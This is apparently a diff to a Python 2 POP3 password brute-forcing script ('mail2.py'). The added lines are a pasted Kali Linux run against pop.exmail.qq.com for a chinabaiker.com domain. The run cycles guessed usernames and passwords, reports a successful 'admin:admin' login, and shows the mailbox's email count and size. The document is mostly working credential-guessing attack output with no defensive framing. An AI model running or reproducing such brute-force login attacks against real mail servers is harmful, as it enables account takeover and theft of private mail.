@@ -58,3 +58,55 @@ if len(success) >=1:
 		print "\t[+] Mail:",res[2],"emails"
 		print "\t[+] Size:",res[3],"bytes\n"
 print "\n[-] Done"
+
+
+
+
+
+
+
+
+
+root@kali:~/Desktop# python mail2.py mail.txt mailpass.txt 110 pop.exmail.qq.com @chinabaiker.com
+++++++++++++
+[*]aaaa@chinabaiker.com:aaaaa
+++++++++++++
+[*]aaaa@chinabaiker.com:ccccc
+++++++++++++
+[*]aaaa@chinabaiker.com:admin
+++++++++++++
+[*]aaaa@chinabaiker.com:ddddd
+++++++++++++
+[*]ssss@chinabaiker.com:aaaaa
+++++++++++++
+[*]ssss@chinabaiker.com:ccccc
+++++++++++++
+[*]ssss@chinabaiker.com:admin
+++++++++++++
+[*]ssss@chinabaiker.com:ddddd
+++++++++++++
+[*]admin@chinabaiker.com:aaaaa
+++++++++++++
+[*]admin@chinabaiker.com:ccccc
+++++++++++++
+[*]admin@chinabaiker.com:admin
+[('admin@chinabaiker.com', 'admin', 166, 10353771)]
+++++++++++++
+[*]ddddd@chinabaiker.com:aaaaa
+++++++++++++
+[*]ddddd@chinabaiker.com:ccccc
+++++++++++++
+[*]ddddd@chinabaiker.com:admin
+++++++++++++
+[*]ddddd@chinabaiker.com:ddddd
+
++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++
+[+] have weakpass :
+
+[+] Login successful: admin@chinabaiker.com admin
+	[+] Mail: 166 emails
+	[+] Size: 10353771 bytes
+
+
+[-] Done
